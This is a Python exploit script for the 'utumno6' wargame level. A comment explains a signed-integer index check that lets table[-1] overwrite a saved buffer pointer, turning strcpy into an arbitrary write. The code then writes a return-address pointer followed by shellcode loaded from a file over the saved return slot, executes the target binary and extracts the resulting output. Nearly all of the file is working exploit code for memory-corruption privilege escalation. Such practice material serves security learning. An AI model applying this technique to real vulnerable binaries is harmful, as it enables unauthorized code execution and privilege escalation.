import ctypes, os, struct, sys, time

# ---------------------------------------------------------------------------
# utumno6's main():
#
#     buf = malloc(0x20);
#     pos   = strtoul(argv[1], 0, 10);     /* index */
#     value = strtoul(argv[2], 0, 16);     /* the value written */
#     if ((int)pos > 0xa) { puts("Illegal position..."); exit(1); }
#     table[pos] = value;                  /* table is a stack array */
#     printf("Table position %d has value %d\nDescription: %s\n",
#            pos, table[pos], argv[3]);
#     strcpy(buf, argv[3]);                /* unbounded copy into malloc(0x20) */
#
# The index is compared as a SIGNED int, but used as a 32-bit index.  Passing
# 4294967295 (-1) passes the `> 0xa` check and writes table[-1], which is the
# saved copy of the `buf` pointer at [ebp-0x34].  So the value we write
# becomes the strcpy DESTINATION: an arbitrary write of argv[3].
#
# We point that destination at the saved return address (ebp+4) and make
# argv[3] = [&code][code].  strcpy then writes the pointer followed by the
# shellcode over the return slot, so "leave; ret" jumps straight into it.
# ---------------------------------------------------------------------------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.execve.argtypes = [ctypes.c_char_p,
                        ctypes.POINTER(ctypes.c_char_p),
                        ctypes.POINTER(ctypes.c_char_p)]

sc = open("/tmp/uu6/sc.bin", "rb").read()
print("shellcode: %d bytes, NUL: %s" % (len(sc), b"\x00" in sc), flush=True)

# measured in gdb for this argv layout (see the recording)
EBP = 0xffffdd68
DST = EBP + 4            # the saved return address slot
CODE = EBP + 8           # the shellcode lands right after the pointer

payload = struct.pack("<I", CODE) + sc

def run():
    argv = (ctypes.c_char_p * 5)(b"/utumno/utumno6", b"4294967295",
                                 hex(DST).encode(), payload, None)
    env = (ctypes.c_char_p * 1)(None)
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1); os.dup2(w, 2); os.close(w)
        devnull = os.open("/dev/null", os.O_RDONLY); os.dup2(devnull, 0)
        libc.execve(b"/utumno/utumno6",
                    ctypes.cast(argv, ctypes.POINTER(ctypes.c_char_p)),
                    ctypes.cast(env, ctypes.POINTER(ctypes.c_char_p)))
        os._exit(1)
    os.close(w)
    out = b""
    end = time.time() + 2.0
    while time.time() < end:
        try:
            chunk = os.read(r, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    os.close(r)
    os.waitpid(pid, 0)
    return out

out = run()
if b"PWN!" not in out:
    print("the write did not reach the return address:", repr(out[:60]))
    sys.exit(1)
print(out.split(b"PWN!")[1][:40].decode("latin-1"), flush=True)
